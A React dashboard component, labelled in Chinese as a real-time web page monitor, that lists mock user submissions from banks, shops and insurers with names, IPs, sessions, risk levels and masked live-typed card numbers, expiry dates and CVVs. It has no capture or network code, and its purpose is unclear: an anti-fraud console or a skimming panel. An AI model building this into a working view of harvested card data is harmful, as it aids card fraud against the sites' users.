import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { useState } from "react";

interface UserSubmission {
  id: string;
  status: "submitted" | "processing" | "verified" | "pending_review" | "rejected";
  statusText: string;
  submissionType: "personal_info" | "credit_card" | "identity_verification" | "address_proof";
  websiteName: string;
  currentPage: string;
  userName: string;
  userLocation?: string;
  timestamp: string;
  progress?: number;
  progressText?: string;
  riskLevel: "low" | "medium" | "high";
  dataSize?: string;
  fieldsCount?: number;
  ipAddress?: string;
  sessionId?: string;
  // 实时输入的敏感信息
  realtimeInput?: {
    phone?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
}

const submissionData: UserSubmission[] = [
  {
    id: "13743",
    status: "processing",
    statusText: "处理中",
    submissionType: "personal_info",
    websiteName: "金融服务平台",
    currentPage: "/profile/personal-info",
    userName: "张小明",
    userLocation: "北京市朝阳区",
    timestamp: "2024-01-20 10:25:16",
    progress: 85,
    progressText: "85%",
    riskLevel: "low",
    dataSize: "402Kb",
    fieldsCount: 12,
    ipAddress: "192.168.1.100",
    sessionId: "sess_abc123",
    realtimeInput: {
      phone: "138****5678",
      cardNumber: "4532 **** **** 1234",
      expiryDate: "12/26",
      cvv: "***"
    }
  },
  {
    id: "13752",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "电商购物网",
    currentPage: "/checkout/payment",
    userName: "李小红",
    userLocation: "上海市浦东区",
    timestamp: "2024-01-20 10:23:45",
    progress: 72,
    progressText: "72%",
    riskLevel: "medium",
    dataSize: "156Kb",
    fieldsCount: 8,
    ipAddress: "192.168.1.105",
    realtimeInput: {
      phone: "189****9876",
      cardNumber: "5555 **** **** 4444",
      expiryDate: "08/25",
      cvv: "***"
    }
  },
  {
    id: "13716",
    status: "pending_review",
    statusText: "待审核",
    submissionType: "identity_verification",
    websiteName: "在线银行系统",
    currentPage: "/kyc/identity-check",
    userName: "王大强",
    userLocation: "广州市天河区",
    timestamp: "2024-01-20 10:20:33",
    riskLevel: "high",
    dataSize: "1.2Mb",
    fieldsCount: 15,
    ipAddress: "192.168.1.88",
    realtimeInput: {
      phone: "159****3210",
      cardNumber: "6226 **** **** 7890",
      expiryDate: "03/27",
      cvv: "***"
    }
  },
  {
    id: "13689",
    status: "submitted",
    statusText: "已提交",
    submissionType: "address_proof",
    websiteName: "保险服务网",
    currentPage: "/registration/address-verification",
    userName: "赵小丽",
    userLocation: "深圳市南山区",
    timestamp: "2024-01-20 10:18:22",
    riskLevel: "low",
    dataSize: "890Kb",
    fieldsCount: 6,
    ipAddress: "192.168.1.92",
    realtimeInput: {
      phone: "135****4567"
    }
  },
  {
    id: "13651",
    status: "verified",
    statusText: "已验证",
    submissionType: "personal_info",
    websiteName: "投资理财平台",
    currentPage: "/onboarding/basic-info",
    userName: "孙小军",
    userLocation: "杭州市西湖区",
    timestamp: "2024-01-20 10:15:41",
    progress: 100,
    progressText: "100%",
    riskLevel: "low",
    dataSize: "234Kb",
    fieldsCount: 10,
    ipAddress: "192.168.1.78",
    realtimeInput: {
      phone: "180****8888",
      cardNumber: "4111 **** **** 1111",
      expiryDate: "11/28",
      cvv: "***"
    }
  },
  {
    id: "13622",
    status: "rejected",
    statusText: "已拒绝",
    submissionType: "credit_card",
    websiteName: "借贷服务平台",
    currentPage: "/application/card-info",
    userName: "周小芳",
    userLocation: "成都市锦江区",
    timestamp: "2024-01-20 10:12:18",
    riskLevel: "high",
    dataSize: "445Kb",
    fieldsCount: 9,
    ipAddress: "192.168.1.201",
    realtimeInput: {
      phone: "176****2345",
      cardNumber: "3782 **** **** 9012",
      expiryDate: "07/24",
      cvv: "***"
    }
  }
];

const getSubmissionTypeIcon = (type: string) => {
  switch (type) {
    case "personal_info": return "👤";
    case "credit_card": return "💳";
    case "identity_verification": return "🆔";
    case "address_proof": return "🏠";
    default: return "📄";
  }
};

const getSubmissionTypeName = (type: string) => {
  switch (type) {
    case "personal_info": return "个人资料";
    case "credit_card": return "信用卡信息";
    case "identity_verification": return "身份验证";
    case "address_proof": return "地址证明";
    default: return "其他文档";
  }
};

export function WebMonitor() {
  const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
  const onlineCount = submissionData.filter(s => s.status === "processing").length;
  const todaySubmissions = submissionData.length;

  const toggleExpanded = (id: string) => {
    const newExpanded = new Set(expandedItems);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedItems(newExpanded);
  };

  return (
    <div className="flex-1 bg-background">
      {/* Header */}
      <div className="border-b border-border bg-white px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">📊 神经网络ML1.15</span>
            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                🔴 LIVE - {onlineCount} 在线处理
              </Badge>
              <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                今日提交: {todaySubmissions}
              </Badge>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🌐 站点管理
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📊 实时统计
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🔒 安全设定
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ⚠️ 风险预警
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📝 日志查看
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Submission List */}
        <div className="space-y-3">
          {submissionData.map((submission, index) => (
            <div key={submission.id} className="bg-white border border-border rounded-lg p-4 hover:shadow-sm transition-shadow">
              <div className="grid grid-cols-12 gap-4 items-center">
                {/* Submission ID & Status */}
                <div className="col-span-2">
                  <div className="flex items-center gap-2">
                    <Badge
                      variant="outline"
                      className={`cursor-pointer transition-all hover:scale-105 ${
                        submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-200 hover:bg-blue-100" :
                        submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-200 hover:bg-orange-100" :
                        submission.status === "verified" ? "bg-green-50 text-green-600 border-green-200 hover:bg-green-100" :
                        submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-200 hover:bg-yellow-100" :
                        "bg-red-50 text-red-600 border-red-200 hover:bg-red-100"
                      }`}
                      onClick={() => toggleExpanded(submission.id)}
                    >
                      {expandedItems.has(submission.id) ? "🔽" : "▶️"} 编号: {submission.id}
                    </Badge>
                  </div>
                  <div className="text-xs text-muted-foreground mt-1">
                    {submission.statusText}
                  </div>
                </div>

                {/* Website & Page Info */}
                <div className="col-span-2">
                  <div className="text-sm text-foreground font-medium">
                    {submission.websiteName}
                  </div>
                  <div className="text-xs text-muted-foreground">
                    {submission.currentPage}
                  </div>
                </div>

                {/* User & Type */}
                <div className="col-span-2">
                  <div className="text-sm text-foreground flex items-center gap-1">
                    {getSubmissionTypeIcon(submission.submissionType)}
                    {getSubmissionTypeName(submission.submissionType)}
                  </div>
                  <div className="text-xs text-muted-foreground">
                    用户: {submission.userName}
                  </div>
                </div>

                {/* Progress */}
                <div className="col-span-3">
                  {submission.progress ? (
                    <div className="space-y-1">
                      <div className="flex justify-between text-xs">
                        <span className="text-muted-foreground">处理进度</span>
                        <span className="text-foreground font-medium">{submission.progressText}</span>
                      </div>
                      <Progress value={submission.progress} className="h-2" />
                    </div>
                  ) : (
                    <div className="text-xs text-muted-foreground">等待处理...</div>
                  )}
                </div>

                {/* Risk & Data Info */}
                <div className="col-span-2">
                  <div className="flex items-center gap-2 mb-1">
                    <Badge 
                      variant="outline"
                      className={
                        submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
                        submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
                        "bg-green-50 text-green-600 border-green-200"
                      }
                    >
                      {submission.riskLevel === "high" ? "🔴 高风险" :
                       submission.riskLevel === "medium" ? "🟡 中风险" :
                       "🟢 低风险"}
                    </Badge>
                  </div>
                  {submission.dataSize && (
                    <div className="text-xs text-muted-foreground">
                      数据: {submission.dataSize} • {submission.fieldsCount} 字段
                    </div>
                  )}
                </div>

                {/* Actions */}
                <div className="col-span-1">
                  <div className="flex flex-col gap-1">
                    {submission.status === "processing" ? (
                      <>
                        <Button variant="outline" size="sm" className="text-xs h-6">
                          监控
                        </Button>
                        <Button variant="outline" size="sm" className="text-xs h-6">
                          阻止
                        </Button>
                      </>
                    ) : submission.status === "pending_review" ? (
                      <>
                        <Button size="sm" className="text-xs h-6 bg-blue-600 hover:bg-blue-700">
                          审核
                        </Button>
                        <Button variant="outline" size="sm" className="text-xs h-6">
                          详情
                        </Button>
                      </>
                    ) : (
                      <>
                        <Button variant="outline" size="sm" className="text-xs h-6">
                          查看
                        </Button>
                        <Button variant="outline" size="sm" className="text-xs h-6">
                          记录
                        </Button>
                      </>
                    )}
                  </div>
                </div>
              </div>

              {/* Extended info - shown when expanded */}
              {expandedItems.has(submission.id) && (
                <div className="mt-3 pt-3 border-t border-border/30 animate-in slide-in-from-top-1 duration-200">
                  <div className="bg-muted/20 rounded-lg p-4">
                    <h4 className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
                      👤 详细用户信息
                    </h4>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs">
                      <div className="space-y-1">
                        <div className="text-muted-foreground">提交时间:</div>
                        <div className="text-foreground font-medium">{submission.timestamp}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">用户位置:</div>
                        <div className="text-foreground font-medium">{submission.userLocation}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">IP地址:</div>
                        <div className="text-foreground font-medium">{submission.ipAddress}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">会话ID:</div>
                        <div className="text-foreground font-medium">{submission.sessionId || "N/A"}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">字段数:</div>
                        <div className="text-foreground font-medium">{submission.fieldsCount}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">数据大小:</div>
                        <div className="text-foreground font-medium">{submission.dataSize}</div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">风险等级:</div>
                        <div className={`font-medium ${
                          submission.riskLevel === "high" ? "text-red-600" :
                          submission.riskLevel === "medium" ? "text-yellow-600" :
                          "text-green-600"
                        }`}>
                          {submission.riskLevel === "high" ? "高风险" :
                           submission.riskLevel === "medium" ? "中风险" : "低风险"}
                        </div>
                      </div>
                      <div className="space-y-1">
                        <div className="text-muted-foreground">状态:</div>
                        <div className={`font-medium ${
                          submission.status === "processing" ? "text-blue-600" :
                          submission.status === "verified" ? "text-green-600" :
                          submission.status === "pending_review" ? "text-yellow-600" :
                          submission.status === "rejected" ? "text-red-600" :
                          "text-orange-600"
                        }`}>
                          {submission.status === "processing" ? "实时监控中" :
                           submission.status === "verified" ? "已验证通过" :
                           submission.status === "pending_review" ? "等待审核" :
                           submission.status === "rejected" ? "已被拒绝" :
                           "等待处理"}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Bottom Summary */}
        <div className="mt-6 pt-4 border-t border-border">
          <div className="grid grid-cols-2 gap-6 mb-4">
            {/* Left: Real-time Statistics */}
            <div className="space-y-2">
              <div className="text-sm font-medium text-foreground">实时统计</div>
              <div className="grid grid-cols-5 gap-3 text-xs">
                <div className="text-center">
                  <div className="text-orange-600 font-medium">
                    {submissionData.filter(s => s.status === "submitted").length}
                  </div>
                  <div className="text-muted-foreground">已提交</div>
                </div>
                <div className="text-center">
                  <div className="text-blue-600 font-medium">
                    {submissionData.filter(s => s.status === "processing").length}
                  </div>
                  <div className="text-muted-foreground">处理中</div>
                </div>
                <div className="text-center">
                  <div className="text-green-600 font-medium">
                    {submissionData.filter(s => s.status === "verified").length}
                  </div>
                  <div className="text-muted-foreground">已验证</div>
                </div>
                <div className="text-center">
                  <div className="text-yellow-600 font-medium">
                    {submissionData.filter(s => s.status === "pending_review").length}
                  </div>
                  <div className="text-muted-foreground">待审核</div>
                </div>
                <div className="text-center">
                  <div className="text-red-600 font-medium">
                    {submissionData.filter(s => s.status === "rejected").length}
                  </div>
                  <div className="text-muted-foreground">已拒绝</div>
                </div>
              </div>
            </div>

            {/* Right: Quick Actions */}
            <div className="space-y-2">
              <div className="text-sm font-medium text-foreground">监控操作</div>
              <div className="flex items-center gap-2 flex-wrap">
                <Button variant="outline" size="sm">
                  🔄 刷新监控
                </Button>
                <Button variant="outline" size="sm">
                  📊 风险分析
                </Button>
                <Button variant="outline" size="sm">
                  📥 导出数据
                </Button>
                <Button variant="outline" size="sm">
                  🔍 高级筛选
                </Button>
                <Button size="sm" className="bg-red-600 hover:bg-red-700">
                  🚨 紧急停止
                </Button>
              </div>
            </div>
          </div>
          
          <div className="text-xs text-muted-foreground">
            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82% • 高风险检出率 15%
          </div>
        </div>
      </div>
    </div>
  );
}
